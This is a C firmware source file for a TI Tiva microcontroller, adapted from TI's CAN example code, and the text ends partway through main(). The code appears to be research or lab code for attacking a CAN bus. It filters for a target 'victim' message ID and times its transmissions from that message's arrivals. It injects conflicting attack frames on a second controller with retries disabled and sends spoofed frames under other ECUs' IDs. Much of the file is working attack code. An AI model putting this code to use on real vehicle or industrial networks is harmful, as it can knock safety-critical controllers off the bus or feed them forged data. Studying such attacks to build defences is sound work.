//*****************************************************************************
//
// Copyright (c) 2010-2020 Texas Instruments Incorporated.  All rights reserved.
// Software License Agreement
// 
//   Redistribution and use in source and binary forms, with or without
//   modification, are permitted provided that the following conditions
//   are met:
// 
//   Redistributions of source code must retain the above copyright
//   notice, this list of conditions and the following disclaimer.
// 
//   Redistributions in binary form must reproduce the above copyright
//   notice, this list of conditions and the following disclaimer in the
//   documentation and/or other materials provided with the  
//   distribution.
// 
//   Neither the name of Texas Instruments Incorporated nor the names of
//   its contributors may be used to endorse or promote products derived
//   from this software without specific prior written permission.
// 
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
// "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
// LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
// A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
// OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
// SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
// LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
// DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
// THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
// (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
// OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
// 
// This is part of revision 2.2.0.295 of the Tiva Firmware Development Package.
//
//*****************************************************************************

#include <stdint.h>
#include <stdbool.h>
#include "inc/hw_can.h"
#include "inc/hw_ints.h"
#include "inc/hw_memmap.h"
#include "inc/hw_types.h"
#include "driverlib/debug.h"
#include "driverlib/fpu.h"
#include "driverlib/can.h"
#include "driverlib/gpio.h"
#include "driverlib/interrupt.h"
#include "driverlib/pin_map.h"
#include "driverlib/rom.h"
#include "driverlib/rom_map.h"
#include "driverlib/sysctl.h"
#include "driverlib/timer.h"


//*****************************************************************************
//
// A counter that keeps track of the number of times the TX & RX interrupt has
// occurred, which should match the number of messages that were transmitted /
// received.
//
//*****************************************************************************
volatile uint32_t g_ui32RXMsgCount = 0;
volatile uint32_t g_ui32TXMsgCount = 0;
volatile uint32_t g_ui32TXHighMsgCount = 0;
volatile uint32_t g_ui32TXMidMsgCount = 0;

volatile uint32_t g_ui32TXCount = 0;
volatile uint32_t g_ui32RXCount = 0;

//*****************************************************************************
//
// A flag for the interrupt handler to indicate that a message was received.
//
//*****************************************************************************
volatile bool g_bRXFlag = 0;

volatile bool g_started = 0;

volatile bool g_epass = false;

volatile bool g_tick = false;

volatile uint8_t g_sync = 1;
volatile uint8_t g_parity = 0;



//*****************************************************************************
//
// A global to keep track of the error flags that have been thrown so they may
// be processed. This is necessary because reading the error register clears
// the flags, so it is necessary to save them somewhere for processing.
//
//*****************************************************************************
volatile uint32_t g_ui32ErrFlag = 0;
volatile uint32_t g_ui32ErrFlag_1 = 0;
//*****************************************************************************
//
// CAN message Objects for data being sent / received
//
//*****************************************************************************
tCANMsgObject g_sCAN0RxMessage;
tCANMsgObject g_sCAN0TxMessage;
tCANMsgObject g_sCAN0TxMessageHigh;
tCANMsgObject g_sCAN0TxMessageAttack1_10;
tCANMsgObject g_sCAN0TxMessageSpoof1_10;
tCANMsgObject g_sCAN0TxMessageSpoof1_100;
tCANMsgObject g_sCAN0TxMessageSpoof1_1000;
tCANMsgObject g_sCAN0TxMessageAttack2_5;
tCANMsgObject g_sCAN0TxMessageSpoof2_5;
tCANMsgObject g_sCAN0TxMessageSpoof2_10;
tCANMsgObject g_sCAN0TxMessageMid;

//*****************************************************************************
//
// Message Identifiers and Objects
//
//*****************************************************************************

#define RXOBJECT             10
#define TXHIGHOBJECT         2
#define TXSPOOFOBJECT2_5     3
#define TXMIDOBJECT          4
#define TXATKOBJECT1         5
#define TXATKOBJECT2         6
#define TXSPOOFOBJECT1_100   7
#define TXOBJECT             8
#define TXSPOOFOBJECT1_1000  9


#define TXSPOOFOBJECT1_10   TXATKOBJECT1
#define TXSPOOFOBJECT2_10    TXATKOBJECT2
//---------


#define ATK1_ID 0xB2
#define ATK1_LEN (1)
uint8_t g_ui8TXMsgDataAttack1[ATK1_LEN] = {0xA6};

#define SPOOFID1_10         ATK1_ID
#define SPOOFID1_10_LEN     ATK1_LEN
uint8_t g_ui8TXMsgDataSpoof1_10[SPOOFID1_10_LEN] = {0x86};

#define SPOOFID1_100    0xC2
#define SPOOFID1_100_LEN (4)
uint8_t g_ui8TXMsgDataSpoof1_100[SPOOFID1_100_LEN] = {0x24,0x33,0x41,0xA2};

#define SPOOFID1_1000   0xD2
#define SPOOFID1_1000_LEN (3)
uint8_t g_ui8TXMsgDataSpoof1_1000[SPOOFID1_1000_LEN] = {0xB0,0xB2,0xB4};

//----------
#define ATK2_ID 0xB3
#define ATK2_LEN (2)
uint8_t g_ui8TXMsgDataAttack2[ATK2_LEN] = { 0xE0, 0x2B };

#define SPOOFID2_5          0xA3
#define SPOOFID2_5_LEN (1)
uint8_t g_ui8TXMsgDataSpoof2_5[SPOOFID2_5_LEN] = {0x42};

#define SPOOFID2_10         ATK2_ID
#define SPOOFID2_10_LEN     ATK2_LEN
uint8_t g_ui8TXMsgDataSpoof2_10[SPOOFID2_10_LEN] = { 0xA0, 0x2B };



#define BITRATE (250000)

#define GENERATE_PRECEDED_MSG   0

#define ATKMSGCOUNT (-1)
#define ATKDELAY(_n) (_n*200)

#define INTERVAL (600000) /* 5 ms */
#define DIFFERENCE ((44*120000)/(BITRATE/1000)) /* approximately 1 1-byte message transmission time */

#define ATK1_DIFFERENCE (0 - 2*DIFFERENCE)


#define ATK1_START (ATKDELAY(2))
#define ATK1_END (ATK1_START + 10000)


//*****************************************************************************
//
// Variables to hold character being sent / reveived
//
//*****************************************************************************
uint8_t g_ui8TXMsgData;
uint8_t g_ui8TXMsgDataHigh[2] = { 0x11, 0x36 };
uint8_t g_ui8TXMsgDataMid[6] = { 0xAF, 0xBC, 0x11, 0x3D, 0xF0, 0x66 };
uint8_t g_ui8RXMsgData[8];

volatile uint32_t g_x;
volatile uint32_t g_y;

//*****************************************************************************
//
// CAN 0 Interrupt Handler. It checks for the cause of the interrupt, and
// maintains a count of all messages that have been transmitted / received
//
//*****************************************************************************
void
CAN0IntHandler(void)
{
    uint32_t ui32Status;

    ROM_IntMasterDisable();

    //
    // Read the CAN interrupt status to find the cause of the interrupt
    //
    // CAN_INT_STS_CAUSE register values
    // 0x0000        = No Interrupt Pending
    // 0x0001-0x0020 = Number of message object that caused the interrupt
    // 0x8000        = Status interrupt
    // all other numbers are reserved and have no meaning in this system
    //
    ui32Status = CANIntStatus(CAN0_BASE, CAN_INT_STS_CAUSE);

    //
    // If this was a status interrupt acknowledge it by reading the CAN
    // controller status register.
    //
    if(ui32Status == CAN_INT_INTID_STATUS)
    {
        //
        // Read the controller status.  This will return a field of status
        // error bits that can indicate various errors. Refer to the
        // API documentation for details about the error status bits.
        // The act of reading this status will clear the interrupt.
        //
        ui32Status = CANStatusGet(CAN0_BASE, CAN_STS_CONTROL);

        //
        // Add ERROR flags to list of current errors. To be handled
        // later, because it would take too much time here in the
        // interrupt.
        //
        g_ui32ErrFlag |= ui32Status;
    }

    //
    // Check if the cause is message object RXOBJECT, which we are using
    // for receiving messages.
    //
    else if(ui32Status == RXOBJECT)
    {
        if ( g_sync == 1 ) {
            // TODO: Read timer and send messages?

            //TimerDisable(TIMER0_BASE, TIMER_A); /* turn off normal mode */
            TimerLoadSet(TIMER0_BASE, TIMER_A, INTERVAL+ATK1_DIFFERENCE);
            //TimerEnable(TIMER1_BASE, TIMER_A);  /* start attack mode! */
            g_sync = 2;
            g_ui32RXMsgCount = g_ui32TXCount;

            /* Change the CAN Message ID to observe */
            //g_sCAN0RxMessage.ui32MsgID = VICTIMID;
            //CANMessageSet(CAN0_BASE, RXOBJECT, &g_sCAN0RxMessage, MSG_OBJ_TYPE_RX);
        }

        CANIntClear(CAN0_BASE, RXOBJECT);

        g_bRXFlag = true;

        g_ui32ErrFlag = 0;
    }

#if 0
    else if(ui32Status == TXOBJECT)
    {
        //
        // Getting to this point means that the TX interrupt occurred on
        // message object TXOBJECT, and the message reception is complete.
        // Clear the message object interrupt.
        //
        CANIntClear(CAN0_BASE, TXOBJECT);

        //
        // Increment a counter to keep track of how many messages have been
        // transmitted. In a real application this could be used to set
        // flags to indicate when a message is transmitted.
        //
        g_ui32TXMsgCount++;

        //
        // Since a message was transmitted, clear any error flags.
        // This is done because before the message is transmitted it triggers
        // a Status Interrupt for TX complete. by clearing the flag here we
        // prevent unnecessary error handling from happeneing
        //
        g_ui32ErrFlag = 0;
    }
    else if (ui32Status == TXMIDOBJECT) {
            CANIntClear(CAN0_BASE, TXMIDOBJECT);
            g_ui32TXMidMsgCount++;
            g_ui32ErrFlag = 0;
        }
    else if (ui32Status == TXHIGHOBJECT) {
        CANIntClear(CAN0_BASE, TXHIGHOBJECT);
        g_ui32TXHighMsgCount++;
        g_ui32ErrFlag = 0;
    }
    else if (ui32Status == TXATKOBJECT1) {
        CANIntClear(CAN0_BASE, TXATKOBJECT1);
        g_ui32ErrFlag = 0;
    }
    else if (ui32Status == TXATKOBJECT2) {
        CANIntClear(CAN0_BASE, TXATKOBJECT2);
        g_ui32ErrFlag = 0;
    }
#endif

    else
    {
        CANIntClear(CAN0_BASE, ui32Status);
        g_ui32ErrFlag = 0;
    }
    ROM_IntMasterEnable();
}

void
CAN1IntHandler(void)
{
    uint32_t ui32Status;

    ROM_IntMasterDisable();

    ui32Status = CANIntStatus(CAN1_BASE, CAN_INT_STS_CAUSE);
    if(ui32Status == CAN_INT_INTID_STATUS)
    {
        ui32Status = CANStatusGet(CAN1_BASE, CAN_STS_CONTROL);
        g_ui32ErrFlag_1 |= ui32Status;
    } else if(ui32Status == TXATKOBJECT1)
    {
        CANIntClear(CAN1_BASE, TXATKOBJECT1);
        g_ui32ErrFlag_1 = 0;
    }
    else
    {
        CANIntClear(CAN1_BASE, ui32Status);
        g_ui32ErrFlag_1 = 0;
    }
    ROM_IntMasterEnable();
}


//****************************************************************************
//
// System clock rate in Hz.
//
//****************************************************************************
uint32_t g_ui32SysClock;

//*****************************************************************************
//
// Flags that contain the current value of the interrupt indicator as displayed
// on the UART.
//
//*****************************************************************************
uint32_t g_ui32Flags;

//*****************************************************************************
//
// The error routine that is called if the driver library encounters an error.
//
//*****************************************************************************
#ifdef DEBUG
void
__error__(char *pcFilename, uint32_t ui32Line)
{
}
#endif

void
send_messages(int count)
{

    CANMessageSet(CAN0_BASE, TXHIGHOBJECT, &g_sCAN0TxMessageHigh,
                  MSG_OBJ_TYPE_TX);

    if ( count % 2 == 0 ) {
        CANMessageSet(CAN0_BASE, TXMIDOBJECT, &g_sCAN0TxMessageMid,
                  MSG_OBJ_TYPE_TX);
    }

    if ( count % 200 == 0 ) {
        CANMessageSet(CAN0_BASE, TXOBJECT, &g_sCAN0TxMessage,
                  MSG_OBJ_TYPE_TX);

        HWREGBITW(&g_ui32Flags, 0) ^= 1;
        GPIOPinWrite(GPIO_PORTF_BASE, GPIO_PIN_0, g_ui32Flags);
    }
}

void
attack_messages_1(int count, int parity) {
    CANMessageSet(CAN0_BASE, TXHIGHOBJECT, &g_sCAN0TxMessageHigh,
                  MSG_OBJ_TYPE_TX);

    if ( count % 2 == parity ) {
        CANMessageSet(CAN1_BASE, TXATKOBJECT1, &g_sCAN0TxMessageAttack1_10,
              MSG_OBJ_TYPE_TX); /* Attack Msg */

        CANMessageSet(CAN0_BASE, TXMIDOBJECT, &g_sCAN0TxMessageMid,
                  MSG_OBJ_TYPE_TX);
    }

    if ( count % 200 == 0 ) {
        CANMessageSet(CAN0_BASE, TXOBJECT, &g_sCAN0TxMessage,
                  MSG_OBJ_TYPE_TX);

        HWREGBITW(&g_ui32Flags, 0) ^= 1;
        GPIOPinWrite(GPIO_PORTF_BASE, GPIO_PIN_0, g_ui32Flags);
    }
}


void
spoof_messages_1(int count)
{
     if ( count % 2 == 0 ) {
         CANMessageSet(CAN0_BASE, TXSPOOFOBJECT1_10, &g_sCAN0TxMessageSpoof1_10,
                   MSG_OBJ_TYPE_TX);
     }

     if ( count % 20 == 0 ) {
          CANMessageSet(CAN0_BASE, TXSPOOFOBJECT1_100, &g_sCAN0TxMessageSpoof1_100,
                    MSG_OBJ_TYPE_TX);
     }

     if ( count % 200 == 0 ) {
         CANMessageSet(CAN0_BASE, TXSPOOFOBJECT1_1000, &g_sCAN0TxMessageSpoof1_1000,
                       MSG_OBJ_TYPE_TX);
     }

}

void spoof_messages_2(int count)
{
    CANMessageSet(CAN0_BASE, TXSPOOFOBJECT2_5, &g_sCAN0TxMessageSpoof2_5,
                  MSG_OBJ_TYPE_TX);
    if ( count % 2 == 0 ) {
        CANMessageSet(CAN0_BASE, TXSPOOFOBJECT2_10, &g_sCAN0TxMessageSpoof2_10,
                  MSG_OBJ_TYPE_TX);
    }
}

void
Timer0IntHandler(void)
{

    if (g_sync == 2) {
        TimerLoadSet(TIMER0_BASE, TIMER_A, INTERVAL); /* Fixup period */
        g_sync = 0;
        g_parity = g_ui32TXCount % 2;
    }

    //
    // Clear the timer interrupt.
    //
    ROM_TimerIntClear(TIMER0_BASE, TIMER_TIMA_TIMEOUT);

    g_tick = true;

    //
    // Update the interrupt status.
    //
#if 0
    ROM_IntMasterDisable();
    ROM_IntMasterEnable();
#endif
}

void
Timer1IntHandler(void)
{
    //uint32_t count;

    ROM_TimerIntClear(TIMER1_BASE, TIMER_TIMA_TIMEOUT);

    TimerEnable(TIMER0_BASE, TIMER_A);
#if 0
    if ( g_ui32RXCount == 0 ) {
        TimerLoadSet(TIMER1_BASE, TIMER_A, INTERVAL); /* Fixup period */
    }

    count = ++g_ui32RXCount;
    send_messages(count);
#endif


    //
    // Update the interrupt status.
    //
#if 0
    ROM_IntMasterDisable();
    ROM_IntMasterEnable();
#endif
}

void
InitCAN0(void)
{
    //
    // For this example CAN0 is used with RX and TX pins on port A0 and A1.
    // GPIO port A needs to be enabled so these pins can be used.
    //
    SysCtlPeripheralEnable(SYSCTL_PERIPH_GPIOA);

    //
    // Configure the GPIO pin muxing to select CAN0 functions for these pins.
    // This step selects which alternate function is available for these pins.
    //
    GPIOPinConfigure(GPIO_PA0_CAN0RX);
    GPIOPinConfigure(GPIO_PA1_CAN0TX);

    //
    // Enable the alternate function on the GPIO pins.  The above step selects
    // which alternate function is available.  This step actually enables the
    // alternate function instead of GPIO for these pins.
    //
    GPIOPinTypeCAN(GPIO_PORTA_BASE, GPIO_PIN_0 | GPIO_PIN_1);

    //
    // The GPIO port and pins have been set up for CAN.  The CAN peripheral
    // must be enabled.
    //
    SysCtlPeripheralEnable(SYSCTL_PERIPH_CAN0);

    //
    // Initialize the CAN controller
    //
    CANInit(CAN0_BASE);

    //CANRetrySet(CAN0_BASE, false);

    //
    // Set up the bit rate for the CAN bus.  This function sets up the CAN
    // bus timing for a nominal configuration.  You can achieve more control
    // over the CAN bus timing by using the function CANBitTimingSet() instead
    // of this one, if needed.
    // In this example, the CAN bus is set to 125 kHz.
    //
    CANBitRateSet(CAN0_BASE, g_ui32SysClock, BITRATE);

    //
    // Enable interrupts on the CAN peripheral.  This example uses static
    // allocation of interrupt handlers which means the name of the handler
    // is in the vector table of startup code.
    //
    CANIntEnable(CAN0_BASE, CAN_INT_MASTER | CAN_INT_ERROR | CAN_INT_STATUS);

    //
    // Enable the CAN interrupt on the processor (NVIC).
    //
    IntEnable(INT_CAN0);

#if 0
    // Loopback Test
    HWREG(CAN0_BASE + CAN_O_CTL) |= CAN_CTL_TEST;
    HWREG(CAN0_BASE + CAN_O_TST) |= CAN_TST_LBACK;
#endif

    //
    // Enable the CAN for operation.
    //
    CANEnable(CAN0_BASE);

    //
    // Initialize a message object to be used for receiving CAN messages with
    // any CAN ID.  In order to receive any CAN ID, the ID and mask must both
    // be set to 0, and the ID filter enabled.
    //
    g_sCAN0RxMessage.ui32MsgID = ATK1_ID; // Only accept target/victim ID
    g_sCAN0RxMessage.ui32MsgIDMask = 0x7FF;
    g_sCAN0RxMessage.ui32Flags = MSG_OBJ_RX_INT_ENABLE | MSG_OBJ_USE_ID_FILTER;
    g_sCAN0RxMessage.ui32MsgLen = sizeof(g_ui8RXMsgData);

    CANMessageSet(CAN0_BASE, RXOBJECT, &g_sCAN0RxMessage, MSG_OBJ_TYPE_RX);

    /* TX Objects */
    g_ui8TXMsgData = 0;
    g_sCAN0TxMessage.ui32MsgID = 0xD0;
    g_sCAN0TxMessage.ui32MsgIDMask = 0;
    g_sCAN0TxMessage.ui32Flags = 0;//MSG_OBJ_TX_INT_ENABLE; // TODO: disable interrupts?
    g_sCAN0TxMessage.ui32MsgLen = sizeof(g_ui8TXMsgData);
    g_sCAN0TxMessage.pui8MsgData = (uint8_t *)&g_ui8TXMsgData;

    g_ui8TXMsgDataHigh[0] = 0;
    g_sCAN0TxMessageHigh.ui32MsgID = 0xA0;
    g_sCAN0TxMessageHigh.ui32MsgIDMask = 0;
    g_sCAN0TxMessageHigh.ui32Flags = 0;//MSG_OBJ_TX_INT_ENABLE;
    g_sCAN0TxMessageHigh.ui32MsgLen = sizeof(g_ui8TXMsgDataHigh);
    g_sCAN0TxMessageHigh.pui8MsgData = (uint8_t *)&g_ui8TXMsgDataHigh;

    g_sCAN0TxMessageMid.ui32MsgID = 0xB0;
    g_sCAN0TxMessageMid.ui32MsgIDMask = 0;
    g_sCAN0TxMessageMid.ui32Flags = 0;//MSG_OBJ_TX_INT_ENABLE;
    g_sCAN0TxMessageMid.ui32MsgLen = sizeof(g_ui8TXMsgDataMid);
    g_sCAN0TxMessageMid.pui8MsgData = (uint8_t *)&g_ui8TXMsgDataMid;

    g_sCAN0TxMessageAttack1_10.ui32MsgID = ATK1_ID;
    g_sCAN0TxMessageAttack1_10.ui32MsgIDMask = 0;
    g_sCAN0TxMessageAttack1_10.ui32Flags = 0;//MSG_OBJ_TX_INT_ENABLE;
    g_sCAN0TxMessageAttack1_10.ui32MsgLen = ATK1_LEN;
    g_sCAN0TxMessageAttack1_10.pui8MsgData = (uint8_t*)&g_ui8TXMsgDataAttack1;

    g_sCAN0TxMessageSpoof1_10.ui32MsgID = SPOOFID1_10;
    g_sCAN0TxMessageSpoof1_10.ui32MsgIDMask = 0;
    g_sCAN0TxMessageSpoof1_10.ui32Flags = 0;//MSG_OBJ_TX_INT_ENABLE;
    g_sCAN0TxMessageSpoof1_10.ui32MsgLen = SPOOFID1_10_LEN;
    g_sCAN0TxMessageSpoof1_10.pui8MsgData = (uint8_t*)&g_ui8TXMsgDataSpoof1_10;

    g_sCAN0TxMessageSpoof1_100.ui32MsgID = SPOOFID1_100;
    g_sCAN0TxMessageSpoof1_100.ui32MsgIDMask = 0;
    g_sCAN0TxMessageSpoof1_100.ui32Flags = 0;//MSG_OBJ_TX_INT_ENABLE;
    g_sCAN0TxMessageSpoof1_100.ui32MsgLen = SPOOFID1_100_LEN;
    g_sCAN0TxMessageSpoof1_100.pui8MsgData = (uint8_t*)&g_ui8TXMsgDataSpoof1_100;

    g_sCAN0TxMessageSpoof1_1000.ui32MsgID = SPOOFID1_1000;
    g_sCAN0TxMessageSpoof1_1000.ui32MsgIDMask = 0;
    g_sCAN0TxMessageSpoof1_1000.ui32Flags = 0;//MSG_OBJ_TX_INT_ENABLE;
    g_sCAN0TxMessageSpoof1_1000.ui32MsgLen = SPOOFID1_1000_LEN;
    g_sCAN0TxMessageSpoof1_1000.pui8MsgData = (uint8_t*)&g_ui8TXMsgDataSpoof1_1000;

    g_sCAN0TxMessageSpoof2_5.ui32MsgID = SPOOFID2_5;
    g_sCAN0TxMessageSpoof2_5.ui32MsgIDMask = 0;
    g_sCAN0TxMessageSpoof2_5.ui32Flags = 0;//MSG_OBJ_TX_INT_ENABLE;
    g_sCAN0TxMessageSpoof2_5.ui32MsgLen = SPOOFID2_5_LEN;
    g_sCAN0TxMessageSpoof2_5.pui8MsgData = (uint8_t*)&g_ui8TXMsgDataSpoof2_5;

    g_sCAN0TxMessageSpoof2_10.ui32MsgID = SPOOFID2_10;
    g_sCAN0TxMessageSpoof2_10.ui32MsgIDMask = 0;
    g_sCAN0TxMessageSpoof2_10.ui32Flags = 0;//MSG_OBJ_TX_INT_ENABLE;
    g_sCAN0TxMessageSpoof2_10.ui32MsgLen = SPOOFID2_10_LEN;
    g_sCAN0TxMessageSpoof2_10.pui8MsgData = (uint8_t*)&g_ui8TXMsgDataSpoof2_10;

}

void
InitCAN1(void)
{
    SysCtlPeripheralEnable(SYSCTL_PERIPH_GPIOB);
    GPIOPinConfigure(GPIO_PB0_CAN1RX);
    GPIOPinConfigure(GPIO_PB1_CAN1TX);
    GPIOPinTypeCAN(GPIO_PORTB_BASE, GPIO_PIN_0 | GPIO_PIN_1);

    SysCtlPeripheralEnable(SYSCTL_PERIPH_CAN1);
    CANInit(CAN1_BASE);
    CANRetrySet(CAN1_BASE, false);
    CANBitRateSet(CAN1_BASE, g_ui32SysClock, BITRATE);
    CANIntEnable(CAN1_BASE, CAN_INT_MASTER | CAN_INT_ERROR | CAN_INT_STATUS);

    IntEnable(INT_CAN1);
    CANEnable(CAN1_BASE);

    /* TX Objects */
    g_sCAN0TxMessageAttack1_10.ui32MsgID = ATK1_ID;
    g_sCAN0TxMessageAttack1_10.ui32MsgIDMask = 0;
    g_sCAN0TxMessageAttack1_10.ui32Flags = 0;//MSG_OBJ_TX_INT_ENABLE;
    g_sCAN0TxMessageAttack1_10.ui32MsgLen = ATK1_LEN;
    g_sCAN0TxMessageAttack1_10.pui8MsgData = (uint8_t*)&g_ui8TXMsgDataAttack1;

    g_sCAN0TxMessageAttack2_5.ui32MsgID = ATK2_ID;
    g_sCAN0TxMessageAttack2_5.ui32MsgIDMask = 0;
    g_sCAN0TxMessageAttack2_5.ui32Flags = 0;//MSG_OBJ_TX_INT_ENABLE;
    g_sCAN0TxMessageAttack2_5.ui32MsgLen = ATK2_LEN;
    g_sCAN0TxMessageAttack2_5.pui8MsgData = (uint8_t*)&g_ui8TXMsgDataAttack2;
}


//*****************************************************************************
//
// Can ERROR handling. When a message is received if there is an erro it is
// saved to g_ui32ErrFlag, the Error Flag Set. Below the flags are checked
// and cleared. It is left up to the user to add handling fuctionality if so
// desiered.
//
// For more information on the error flags please see the CAN section of the
// microcontroller datasheet.
//
// NOTE: you may experience errors during setup when only one board is powered
// on. This is caused by one board sending signals and there not being another
// board there to acknoledge it. Dont worry about these errors, they can be
// disregarded.
//
//*****************************************************************************
void
CANErrorHandler(void)
{
    //
    // CAN controller has entered a Bus Off state.
    //
    if(g_ui32ErrFlag & CAN_STATUS_BUS_OFF)
    {
        //
        // Handle Error Condition here
        //
        //UARTprintf("    ERROR: CAN_STATUS_BUS_OFF \n");
// TODO: LED Status?
        GPIOPinWrite(GPIO_PORTN_BASE, GPIO_PIN_0, 1);
        //
        // Clear CAN_STATUS_BUS_OFF Flag
        //
        g_ui32ErrFlag &= ~(CAN_STATUS_BUS_OFF);

    }

    //
    // CAN controller error level has reached warning level.
    //
    if(g_ui32ErrFlag & CAN_STATUS_EWARN)
    {
        //
        // Handle Error Condition here
        //
        //UARTprintf("    ERROR: CAN_STATUS_EWARN \n");
        GPIOPinWrite(GPIO_PORTF_BASE, GPIO_PIN_4, 1);

        //
        // Clear CAN_STATUS_EWARN Flag
        //
        g_ui32ErrFlag &= ~(CAN_STATUS_EWARN);
    } else {
        GPIOPinWrite(GPIO_PORTF_BASE, GPIO_PIN_4, 0);
    }

    //
    // CAN controller error level has reached error passive level.
    //
    if(g_ui32ErrFlag & CAN_STATUS_EPASS)
    {
        //
        // Handle Error Condition here
        //
        g_epass = true;
        GPIOPinWrite(GPIO_PORTF_BASE, GPIO_PIN_4, 1);
        //CANRetrySet(CAN0_BASE, false);

        //
        // Clear CAN_STATUS_EPASS Flag
        //
        g_ui32ErrFlag &= ~(CAN_STATUS_EPASS);
    }

    //
    // A message was received successfully since the last read of this status.
    //
    if(g_ui32ErrFlag & CAN_STATUS_RXOK)
    {
        //
        // Handle Error Condition here
        //

        //
        // Clear CAN_STATUS_RXOK Flag
        //
        g_ui32ErrFlag &= ~(CAN_STATUS_RXOK);
    }

    //
    // A message was transmitted successfully since the last read of this
    // status.
    //
    if(g_ui32ErrFlag & CAN_STATUS_TXOK)
    {
        //
        // Handle Error Condition here
        //

        //
        // Clear CAN_STATUS_TXOK Flag
        //
        g_ui32ErrFlag &= ~(CAN_STATUS_TXOK);
    }

    //
    // This is the mask for the last error code field.
    //
    if(g_ui32ErrFlag & CAN_STATUS_LEC_MSK)
    {
        //
        // Handle Error Condition here
        //

        //
        // Clear CAN_STATUS_LEC_MSK Flag
        //
        g_ui32ErrFlag &= ~(CAN_STATUS_LEC_MSK);
    }

    //
    // A bit stuffing error has occurred.
    //
    if(g_ui32ErrFlag & CAN_STATUS_LEC_STUFF)
    {
        //
        // Handle Error Condition here
        //

        //
        // Clear CAN_STATUS_LEC_STUFF Flag
        //
        g_ui32ErrFlag &= ~(CAN_STATUS_LEC_STUFF);
    }

    //
    // A formatting error has occurred.
    //
    if(g_ui32ErrFlag & CAN_STATUS_LEC_FORM)
    {
        //
        // Handle Error Condition here
        //

        //
        // Clear CAN_STATUS_LEC_FORM Flag
        //
        g_ui32ErrFlag &= ~(CAN_STATUS_LEC_FORM);
    }

    //
    // An acknowledge error has occurred.
    //
    if(g_ui32ErrFlag & CAN_STATUS_LEC_ACK)
    {
        //
        // Handle Error Condition here
        //

        //
        // Clear CAN_STATUS_LEC_ACK Flag
        //
        g_ui32ErrFlag &= ~(CAN_STATUS_LEC_ACK);
    }

    //
    // The bus remained a bit level of 1 for longer than is allowed.
    //
    if(g_ui32ErrFlag & CAN_STATUS_LEC_BIT1)
    {
        //
        // Handle Error Condition here
        //

        //
        // Clear CAN_STATUS_LEC_BIT1 Flag
        //
        g_ui32ErrFlag &= ~(CAN_STATUS_LEC_BIT1);
    }

    //
    // The bus remained a bit level of 0 for longer than is allowed.
    //
    if(g_ui32ErrFlag & CAN_STATUS_LEC_BIT0)
    {
        //
        // Handle Error Condition here
        //

        //
        // Clear CAN_STATUS_LEC_BIT0 Flag
        //
        g_ui32ErrFlag &= ~(CAN_STATUS_LEC_BIT0);
    }

    //
    // A CRC error has occurred.
    //
    if(g_ui32ErrFlag & CAN_STATUS_LEC_CRC)
    {
        //
        // Handle Error Condition here
        //

        //
        // Clear CAN_STATUS_LEC_CRC Flag
        //
        g_ui32ErrFlag &= ~(CAN_STATUS_LEC_CRC);
    }

    //
    // This is the mask for the CAN Last Error Code (LEC).
    //
    if(g_ui32ErrFlag & CAN_STATUS_LEC_MASK)
    {
        //
        // Handle Error Condition here
        //

        //
        // Clear CAN_STATUS_LEC_MASK Flag
        //
        g_ui32ErrFlag &= ~(CAN_STATUS_LEC_MASK);
    }

    //
    // If there are any bits still set in g_ui32ErrFlag then something unhandled
    // has happened. Print the value of g_ui32ErrFlag.
    //
    if(g_ui32ErrFlag !=0)
    {
        //UARTprintf("    Unhandled ERROR: %x \n",g_ui32ErrFlag);
    }
}

int
main(void)
{
    int count = 0;

    //
    // Enable lazy stacking for interrupt handlers.  This allows floating-point
    // instructions to be used within interrupt handlers, but at the expense of
    // extra stack usage.
    //
    //ROM_FPULazyStackingEnable();

    //
    // Set the clocking to run directly from the crystal at 120MHz.
    //
    g_ui32SysClock = SysCtlClockFreqSet((SYSCTL_XTAL_25MHZ |
                                             SYSCTL_OSC_MAIN |
                                             SYSCTL_USE_PLL |
                                             SYSCTL_CFG_VCO_480), 120000000);


    // TODO: Refactor below: InitLEDs()
    //
    // Enable the GPIO port that is used for the on-board LEDs.
    //
    ROM_SysCtlPeripheralEnable(SYSCTL_PERIPH_GPION);
    ROM_SysCtlPeripheralEnable(SYSCTL_PERIPH_GPIOF);

    //
    // Enable the GPIO pins for the LEDs (PN0 & PN1).
    //
    ROM_GPIOPinTypeGPIOOutput(GPIO_PORTN_BASE, GPIO_PIN_0 | GPIO_PIN_1);
    ROM_GPIOPinTypeGPIOOutput(GPIO_PORTF_BASE, GPIO_PIN_0 | GPIO_PIN_4);


    //
    // Enable the peripherals used by this example.
    //
    ROM_SysCtlPeripheralEnable(SYSCTL_PERIPH_TIMER0);
    ROM_SysCtlPeripheralEnable(SYSCTL_PERIPH_TIMER1);

    //
    // Enable processor interrupts.
    //
    ROM_IntMasterEnable();
    IntMasterEnable();


    ROM_TimerConfigure(TIMER0_BASE, TIMER_CFG_PERIODIC);
    //TimerConfigure(TIMER0_BASE, TIMER_CFG_A_ONE_SHOT);
    // Configure as one-shot
//    TimerConfigure(TIMER1_BASE, TIMER_CFG_A_ONE_SHOT);

    ROM_TimerLoadSet(TIMER0_BASE, TIMER_A, INTERVAL);
    //ROM_TimerLoadSet(TIMER1_BASE, TIMER_A, g_ui32SysClock / 2);

//    TimerLoadSet(TIMER1_BASE, TIMER_A, INTERVAL-(ATKMSGCOUNT+1)*DIFFERENCE); /* ~2 msgs less than 5ms */

    IntEnable(INT_TIMER0A);
    TimerIntEnable(TIMER0_BASE, TIMER_TIMA_TIMEOUT);
//    IntEnable(INT_TIMER1A);
//    TimerIntEnable(TIMER1_BASE, TIMER_TIMA_TIMEOUT);

    InitCAN0();
    InitCAN1();

    ROM_TimerEnable(TIMER0_BASE, TIMER_A);
    //ROM_TimerEnable(TIMER1_BASE, TIMER_A);

    //
    // Loop forever while the timers run.
    //
    while(1)
